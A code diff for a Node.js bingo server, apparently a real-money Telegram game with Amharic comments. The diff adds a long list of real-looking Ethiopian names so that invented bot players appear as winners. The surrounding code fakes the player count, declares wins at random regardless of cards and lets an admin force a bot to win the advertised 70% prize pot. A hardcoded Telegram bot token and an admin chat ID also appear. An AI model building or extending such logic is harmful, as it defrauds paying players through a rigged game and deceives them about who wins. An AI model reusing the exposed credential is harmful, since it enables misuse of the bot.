@@ -26,11 +26,56 @@ app.use(express.static(path.join(__dirname, 'public')));
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8816726564:AAG3ETwx98oBfjDV8I-BipzEXGZCnJPFezg";
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || "371093083";
 
+// 🟢 ራሱ አቤል የሰጠው ትክክለኛ እና የተሟላ የቦቶች ስሞች ዝርዝር
+const ETHIOPIAN_BOT_NAMES = [
+    "Henok", "Dani", "Simret Getachew", "Anwar", "Naughty By nature",
+    "Ñãtåñ......", "kali", "Mohammedsani Sulitan", "Wubamlak Belste", "Lina Habtamu",
+    "Nimo", "Šà¥¢ø Qü€€ñ", "Beki", "syf", "Time Of",
+    "§mrĕţ", "L F U", "sosi", "Megdi", "Sittina",
+    "Ibra", "Abebaw", "Frew", "Quarezma", "Dibora",
+    "Osmhen", "Chala", "Surafel", "Zehara", "Worku",
+    "Fiyorina", "Kirra", "Bilal", "Pilatos", "Merlin",
+    "Osmehin", "Denver", "Belew", "Jilalu", "Gizachew Kassahun",
+    "bereket dagne", "Mesfin", "ሞለፍን ኔትስት ገበየሁ", "Birukte#🦋", "🦋Meklit🦋",
+    "Abel x", "Farhewot Yashtla", "🅖ⓞⓞⓓ🌹", "YO", "እያሱ",
+    "Goyta Miraw ጣምራው", "0919091129", "Gdg", "Lai", "Sintayehu Getachew",
+    "Pipo Kassa", "ገብርኤል አባቴ", "Yohannes Ng", "Gech man", "Devido ✝",
+    "Seydou Kamite", "Mamush Kasim Mucaa Kakuuuu", "Aman yi", "Ahmed Basher",
+    "Wenda last King", "Abonesh Kinfu", "Lij yalfex jinka 🫅", "Big Boss 💪", "Firde Nigus",
+    "ANIE X YUKKI", "Girum Edeshawu", "Bini Teketele", "Abdella Mohammed Ebrahim", "Asbada Abubakar",
+    "Ebrahim M/d Ebrahim", "Abdu Shekna", "Abdujalil Ahmed Detolale", "urjii 🥷", "Amoo",
+    "Assistant 2", "Anu 28", "ማኅበል", "Yd", "Girmay Nigus",
+    "Yohannes", "H 5", "አበነህ 💕💕💕", "Tolosa", "Kejelcha Mamo",
+    "Ashagre", "Ed", "Gedefaw Aseffa", "D 7", "Getachew",
+    "Tamirat Girma", "Ashenafi", "Dada", "Demsash", "ድር ድር",
+    "አፒው", "Ahadi Ahemed", "skat mamaniyø", "tamirat", "kasu",
+    "PPP✌️🔥😋69", "Ad la", "Astu Bast", "getesh aresenal", "WALEX JOSEF",
+    "Habet", "♠[$]♠", "Ratum yasın", "ˋHEER X MUSICˎ", "Alemayehu Tesema",
+    "habtu moges", "‖꧁Tame꧂‖", "Alexs Kebede", "Dagna King", "Haileyesus Geremew",
+    "Chicken Road", "nal", "Wase", "Y@imam", "Current thing",
+    "Wizzy", "weyn Ter", "Tedi", "Tame 😍", "Fenaan Fenaan Barbaadi",
+    "Fire Tesfaye", "Samii", "Tesfaye Asnake", "Teg 0920", "Mitiku57 Kibatu",
+    "yohannes online", "Melkamnew", "L14", "Terryson Cruzman", "Teddy",
+    "kefle birhane", "Abushi 💀💀", "Yonase Tesema", "Mulugeta Fantahun", "Kifle Møk",
+    "Pro max", "Nscros", "የማርያም", "አቤል", "Tloya",
+    "ተሜ", "bakle", "ናቲና", "Dj", "wanaw",
+    "Falcon", "Dawit_B", "Ermias_99", "Solomon_K", "Bethel_M",
+    "Miki_Bingo", "Hanna_T", "Natnael_X", "Kidist_L", "Bereket_P",
+    "Samson_G", "Yordanos_K", "Feven_A", "Henok_Z", "Meron_W",
+    "Rediet_S", "Abel_T", "Tsion_M", "Brook_H", "Lidya_D",
+    "Michael_B", "Nahom_V", "Rut_K", "Robel_M", "Tigist_Y",
+    "Biniyam_C", "Kalkidan_F", "Ephrem_G", "Rahel_N", "Yonas_P", "Semhar_L"
+];
+
+function getRandomBotName() {
+    return ETHIOPIAN_BOT_NAMES[Math.floor(Math.random() * ETHIOPIAN_BOT_NAMES.length)];
+}
+
 let globalRoom = {
     gameActive: false,
     calledNumbers: [],
-    gameStartTime: Date.now() + 30000,
-    playersCount: 140,
+    gameStartTime: Date.now() + 60000,
+    playersCount: 114,
     takenCards: [],
     playerRoundCards: {},
     playerTemporaryCards: {},
@@ -67,7 +112,7 @@ function getRealisticBotsCount(realCount) {
 
 // 🟢 እንደ ተጫዋቾች ብዛት የቆይታ ሰዓቱን (Countdown Duration) በዲናሚክ መወሰን
 function calculateDynamicRoundDuration() {
-    let pCount = globalRoom.playersCount || 140;
+    let pCount = globalRoom.playersCount || 114;
     if (pCount > 200) return 20000; 
     if (pCount > 100) return 30000; 
     return 40000; 
@@ -104,11 +149,11 @@ function simulateBotCardSelections() {
 
 setInterval(simulateBotCardSelections, 6000);
 
-// 🟢 ዋናው የጨዋታ ዑደት (Game Loop & Countdown Timer - FIXED TO PREVENT FREEZING)
+// 🟢 ዋናው የጨዋታ ዑደት (Game Loop & Countdown Timer)
 function startMainGameLoop() {
     if (gameInterval) clearInterval(gameInterval);
 
-    globalRoom.gameStartTime = Date.now() + calculateDynamicRoundDuration();
+    globalRoom.gameStartTime = Date.now() + 60000; // 60 ሰከንድ ቆጣሪ
 
     gameInterval = setInterval(() => {
         let timeLeft = globalRoom.gameStartTime - Date.now();
@@ -124,7 +169,7 @@ function startMainGameLoop() {
             if (numberCallInterval) clearInterval(numberCallInterval);
             let availableNumbers = Array.from({length: 75}, (_, i) => i + 1);
             
-            // የቁጥር ጥሪ ሎጅክ (በየ 2.5 ሰከንዱ አንዲት ቁጥር እየጠራ)
+            // 🟢 የቁጥር ጥሪ ሎጅክ (በየ 3 ሰከንዱ አንዲት ቁጥር እየጠራ)
             numberCallInterval = setInterval(() => {
                 if (!globalRoom.gameActive) {
                     if (numberCallInterval) {
@@ -154,15 +199,15 @@ function startMainGameLoop() {
                 let shouldTriggerWin = (globalRoom.calledNumbers.length >= 12 && Math.random() < 0.30) || (globalRoom.calledNumbers.length >= 30);
 
                 if (shouldTriggerWin || forcedNextWinner) {
-                    let winningCardNum = 22;
-                    let winningUsername = "ተጫዋች";
+                    let winningCardNum = Math.floor(Math.random() * 500) + 1;
+                    let winningUsername = getRandomBotName(); 
                     let winningUserId = null;
                     let winnersCount = 1;
 
                     let entries = Object.entries(globalRoom.playerRoundCards);
                     
                     if (forcedNextWinner === 'bot') {
-                        winningUsername = "አቶ ቦት";
+                        winningUsername = getRandomBotName();
                         winningCardNum = Math.floor(Math.random() * 500) + 1;
                         winnersCount = 1;
                     } else if (forcedNextWinner === 'multi_real_3') {
@@ -186,7 +231,7 @@ function startMainGameLoop() {
                     }
 
                     // 70% ለአሸናፊው የሚሄድ የገንዘብ ድርሻ (Total Pot = playersCount * 10 ብር)
-                    let totalPot = (globalRoom.playersCount || 140) * 10;
+                    let totalPot = (globalRoom.playersCount || 114) * 10;
                     let prizePool = Math.floor(totalPot * 0.70);
 
                     io.emit('bingoWinner', {
@@ -206,10 +251,10 @@ function startMainGameLoop() {
                     
                     setTimeout(() => {
                         endRoundAndRestart();
-                    }, 4000);
+                    }, 5000);
                 }
 
-            }, 2500); 
+            }, 3000); // 🟢 በየ 3 ሰከንዱ (3000ms) አንዲት ቁጥር እንዲጠራ ተስተካክሏል
         }
     }, 1000);
 }
@@ -224,10 +269,9 @@ function endRoundAndRestart() {
     globalRoom.lastCalledNumber = null;
     globalRoom.playerRoundCards = {}; 
     
-    let dynamicDuration = calculateDynamicRoundDuration();
-    globalRoom.gameStartTime = Date.now() + dynamicDuration;
+    globalRoom.gameStartTime = Date.now() + 60000;
     
-    io.emit('roundEnded', { nextGameIn: dynamicDuration });
+    io.emit('roundEnded', { nextGameIn: 60000 });
     io.emit('gameEndedBroadcast');
     refreshTakenCardsList();
 }
